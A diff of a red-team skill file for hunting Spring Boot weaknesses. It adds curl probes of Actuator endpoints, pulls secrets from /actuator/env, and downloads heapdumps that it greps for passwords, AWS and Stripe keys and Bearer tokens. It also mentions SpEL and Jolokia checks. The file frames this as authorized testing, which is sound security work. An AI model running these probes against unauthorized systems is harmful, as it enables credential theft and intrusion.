@@ -4,11 +4,51 @@ description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (h
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [springboot, hunt, redteam, java]
+platforms: [linux]
+metadata:
+  tags: [springboot, hunt, redteam, java]
+  category: redteam
 ---
 
 # HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
+
+## When to Use
+
+- Target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page.
+- Java stack traces.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Spring Boot indicators
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"
+
+# Actuator root (may list available endpoints)
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null
+
+# Try common base paths
+for base in "" "/manage" "/management" "/app"; do
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
+  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
+done
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -50,7 +90,7 @@ done
 BASE="https://$TARGET/actuator"
 
 # High-impact endpoints
-ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
+ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics"
            "loggers" "info" "health" "configprops" "shutdown" "trace"
            "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
            "flyway" "liquibase" "refresh" "restart")
@@ -70,7 +110,7 @@ done
 curl --max-time 30 --connect-timeout 10 -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20
 
 # Get all endpoint mappings (full API surface)
-curl --max-time 30 --connect-timeout 10 -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -Eo '"pattern":"\K[^"]+' | sort
+curl --max-time 30 --connect-timeout 10 -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -Po '"pattern":"\K[^"]+' | sort
 
 # Get Spring beans (lists all registered beans, reveals internal architecture)
 curl --max-time 30 --connect-timeout 10 -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
@@ -90,7 +130,7 @@ strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|be
   grep -v "^[a-z_]" | sort -u | head -50
 
 # More targeted extraction
-strings /tmp/heapdump.hprof | grep -Eo "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
+strings /tmp/heapdump.hprof | grep -Po "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
 strings /tmp/heapdump.hprof | grep -Eo "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
 strings /tmp/heapdump.hprof | grep -Eo "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
 strings /tmp/heapdump.hprof | grep -Eo "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens
@@ -210,8 +250,16 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia/exec/com.sun
 
 ---
 
-## Validation
+## Pitfalls
+- **Actuator endpoints without sensitive data** — `/actuator/health` or `/actuator/info` are intentionally public. Need `/actuator/env`, `/actuator/heapdump`, or `/actuator/mappings`.
+- **/actuator/env with sanitized values** — Spring Boot 2.x+ sanitizes env values by default. Need unsanitized secrets.
+- **/actuator/heapdump download** — heapdump analysis requires Eclipse MAT or similar. The finding is the dump is accessible, not what it contains (prove with actual extracted secrets).
+- **/actuator/loggers modification** — changing log level to DEBUG can leak sensitive data. Demonstrate the leaked data.
+- **Spring Boot version without CVE** — version disclosure is informational unless paired with a CVE affecting that specific version.
 
+---
+
+## Verification
 ✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
 ✅ Actuator/env: secrets visible in JSON response
 ✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
@@ -225,34 +273,3 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/jolokia/exec/com.sun
 - Mappings disclosure only: Low-Medium
 
 ---
-
-## Verification
-
-Run this self-test to confirm springboot hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-springboot" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
-## Pitfalls
-- **Actuator endpoints without sensitive data** — `/actuator/health` or `/actuator/info` are intentionally public. Need `/actuator/env`, `/actuator/heapdump`, or `/actuator/mappings`.
-- **/actuator/env with sanitized values** — Spring Boot 2.x+ sanitizes env values by default. Need unsanitized secrets.
-- **/actuator/heapdump download** — heapdump analysis requires Eclipse MAT or similar. The finding is the dump is accessible, not what it contains (prove with actual extracted secrets).
-- **/actuator/loggers modification** — changing log level to DEBUG can leak sensitive data. Demonstrate the leaked data.
-- **Spring Boot version without CVE** — version disclosure is informational unless paired with a CVE affecting that specific version.
